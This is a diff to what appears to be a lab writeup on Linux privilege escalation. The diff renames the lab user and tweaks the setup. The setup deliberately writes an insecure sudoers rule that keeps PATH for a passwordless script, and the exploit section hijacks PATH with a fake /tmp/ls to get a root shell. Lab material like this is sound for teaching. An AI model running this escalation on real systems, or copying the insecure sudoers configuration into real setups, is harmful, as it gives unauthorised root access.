@@ -3,10 +3,11 @@
 ```sh
 # root
 cp /etc/sudoers /etc/sudoers.bak
-adduser attacker
-echo "attacker ALL=(ALL) NOPASSWD: /home/attacker/script.sh" >> /etc/sudoers
-echo "Defaults env_keep += PATH" >> /etc/sudoers
-echo 'ls -la' > /home/attacker/script.sh
+adduser sudo1
+echo "sudo1 ALL=(ALL) NOPASSWD: /home/sudo1/script.sh" >> /etc/sudoers
+echo "Defaults env_keep = PATH" >> /etc/sudoers
+echo 'ls -la' > /home/sudo1/script.sh
+chmod +x /home/sudo1/script.sh
 ```
 
 # Exploit
@@ -14,7 +15,7 @@ echo 'ls -la' > /home/attacker/script.sh
 ```bash
 echo '/bin/bash' > /tmp/ls
 
-sudo PATH=/tmp/:$PATH /home/attacker/script.sh
+sudo PATH=/tmp/:$PATH /home/sudo1/script.sh
 ```
 
 
@@ -28,6 +29,6 @@ sudo PATH=/tmp/:$PATH /home/attacker/script.sh
 # Clean Up
 
 ```bash
-deluser attacker --remove-home
+deluser sudo1 --remove-home
 cp /etc/sudoers.bak /etc/sudoers
 ```
